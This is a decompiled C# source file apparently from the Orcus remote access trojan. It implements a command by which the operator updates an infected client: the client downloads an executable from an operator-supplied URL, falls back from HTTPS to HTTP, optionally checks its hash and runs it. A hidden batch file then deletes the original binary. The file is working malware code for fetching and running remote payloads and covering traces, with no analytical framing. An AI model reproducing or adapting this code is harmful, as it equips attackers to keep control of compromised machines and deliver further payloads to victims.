using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands;

public class UpdateFromUrlCommandEx : UpdateFromUrlCommand
{
	public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
	{
		commandParameter.InitializeProperties((StaticCommand)(object)this);
		FileInfo fileInfo = new FileInfo(FileExtensions.GetFreeTempFileName("exe"));
		bool flag = false;
		Uri uri = new Uri(((UpdateFromUrlCommand)this).get_DownloadUrl());
		for (int i = 0; i < 10; i++)
		{
			try
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri(((UpdateFromUrlCommand)this).get_DownloadUrl()), fileInfo.FullName);
			}
			catch (Exception ex)
			{
				if (i == 4 && uri.Scheme == "https")
				{
					uri = new UriBuilder(uri)
					{
						Scheme = Uri.UriSchemeHttp,
						Port = -1
					}.Uri;
				}
				if (i == 9)
				{
					FeedbackFactoryExtensions.ErrorMessage(feedbackFactory, ex.Message);
				}
				continue;
			}
			Thread.Sleep(100);
			if (!string.IsNullOrEmpty(((UpdateFromUrlCommand)this).get_Hash()))
			{
				try
				{
					byte[] first;
					using (FileStream inputStream = File.OpenRead(fileInfo.FullName))
					{
						using SHA256Managed sHA256Managed = new SHA256Managed();
						first = sHA256Managed.ComputeHash(inputStream);
					}
					if (!first.SequenceEqual(StringExtensions.HexToBytes(((UpdateFromUrlCommand)this).get_Hash())))
					{
						fileInfo.Delete();
						FeedbackFactoryExtensions.ErrorMessage(feedbackFactory, "The hash value doesn't equal the transmitted hash value");
						continue;
					}
				}
				catch (Exception)
				{
					continue;
				}
			}
			flag = true;
			break;
		}
		if (!flag)
		{
			feedbackFactory.Failed();
			return;
		}
		UninstallHelper.RemoveAllDependencies();
		UninstallHelper.RemoveOtherStuff();
		feedbackFactory.Succeeded();
		Program.Unload();
		try
		{
			string applicationPath = Consts.ApplicationPath;
			string freeTempFileName = FileExtensions.GetFreeTempFileName("bat");
			File.SetAttributes(applicationPath, FileAttributes.Normal);
			string contents = $"@ECHO OFF\r\nping 127.0.0.1 > nul\r\necho j | del \"{applicationPath}\"\r\necho j | del {applicationPath}";
			File.WriteAllText(freeTempFileName, contents);
			ProcessStartInfo startInfo = new ProcessStartInfo(freeTempFileName)
			{
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process.Start(fileInfo.FullName, ((UpdateFromUrlCommand)this).get_Arguments());
			Process.Start(startInfo);
		}
		catch (Exception)
		{
			Application.Restart();
			return;
		}
		Program.Exit();
	}
}
